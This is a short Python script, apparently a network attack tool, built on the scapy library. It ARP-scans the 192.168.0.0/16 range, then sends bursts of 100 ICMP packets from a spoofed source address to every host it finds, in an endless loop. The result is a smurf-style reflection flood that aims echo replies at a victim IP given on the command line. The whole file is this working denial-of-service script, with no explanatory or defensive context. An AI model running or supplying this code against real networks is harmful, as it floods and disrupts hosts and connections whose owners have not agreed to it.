#!/usr/bin/python

from scapy.all import *
from scapy.layers.inet import *
import sys

from scapy.layers.l2 import arping


def send_packet(a):
    send(IP(src=sys.argv[1], dst=a) / ICMP()/"testICMPpacket", count=100)
    # send(IP(src=a, dst=sys.argv[1]) / ICMP())


def main():
    a = arping('192.168.0.0/16', verbose=0)
    # a = arping('192.168.0.255/16', verbose=0)
    for i in a[0]:
        send_packet(i[0].pdst)


if __name__ == '__main__':
    # for j in range(0, 5):
    while True:
        # print (j)
        main()
